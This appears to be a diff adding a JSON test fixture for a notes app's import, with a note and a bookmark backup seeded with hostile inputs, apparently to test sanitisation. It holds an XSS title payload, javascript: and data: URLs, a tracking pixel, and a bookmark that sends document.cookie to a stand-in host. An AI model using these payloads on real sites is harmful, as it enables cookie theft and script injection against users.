@@ -1,0 +1,86 @@
+{
+ "ui_lang": "vi",
+ "bbqone_local_folders": [
+  {
+   "id": "00000000-0000-4000-8000-000000000066",
+   "name": "Work",
+   "position": 0,
+   "created_at": "2026-10-29T00:00:00.000Z",
+   "updated_at": "2026-10-29T00:00:00.000Z",
+   "is_secure": false,
+   "secure_salt": null,
+   "pbkdf2_iterations": 310000,
+   "secure_verifier_enc": null,
+   "__synced": false
+  }
+ ],
+ "bbqone_local_notes": [
+  {
+   "id": "00000000-0000-4000-8000-00000000006e",
+   "folder_id": "00000000-0000-4000-8000-000000000066",
+   "title": "Pixel note <img src=x onerror=alert(\"title\")>",
+   "tags": [],
+   "created_at": "2026-10-29T00:00:00.000Z",
+   "updated_at": "2026-10-29T00:00:00.000Z",
+   "synced_at": null,
+   "__synced": false
+  }
+ ],
+ "bbqone_local_note_bodies": [
+  {
+   "id": "00000000-0000-4000-8000-000000000062",
+   "note_id": "00000000-0000-4000-8000-00000000006e",
+   "label": "",
+   "position": 0,
+   "created_at": "2026-10-29T00:00:00.000Z",
+   "updated_at": "2026-10-29T00:00:00.000Z",
+   "synced_at": null,
+   "__synced": false,
+   "content": "<p>tracking pixel here</p><img src=\"https://evil.example/pixel.png\"><a href=\"javascript:alert(1)\">x</a><pre class=\"retro-code-block\"><code class=\"language-sql\">SELECT * FROM users WHERE id = 1;</code></pre>"
+  }
+ ],
+ "bbqone_local_bookmarks": [
+  {
+   "id": "00000000-0000-4000-8000-00000000006b",
+   "label": "evil backup",
+   "browser_hint": "chrome",
+   "created_at": "2026-10-29T00:00:00.000Z",
+   "encrypted": false,
+   "__synced": false,
+   "tree_json": [
+    {
+     "id": "0",
+     "title": "",
+     "children": [
+      {
+       "id": "1",
+       "title": "Bookmarks bar",
+       "children": [
+        {
+         "id": "10",
+         "title": "Good",
+         "url": "https://good.example/?a=1&b=\"2\""
+        },
+        {
+         "id": "11",
+         "title": "Steal",
+         "url": "javascript:fetch(\"https://evil.example/?c=\"+document.cookie)"
+        },
+        {
+         "id": "12",
+         "title": "Data",
+         "url": "data:text/html,<script>alert(1)</script>"
+        }
+       ]
+      },
+      {
+       "id": "2",
+       "title": "Other bookmarks",
+       "children": []
+      }
+     ]
+    }
+   ]
+  }
+ ]
+}
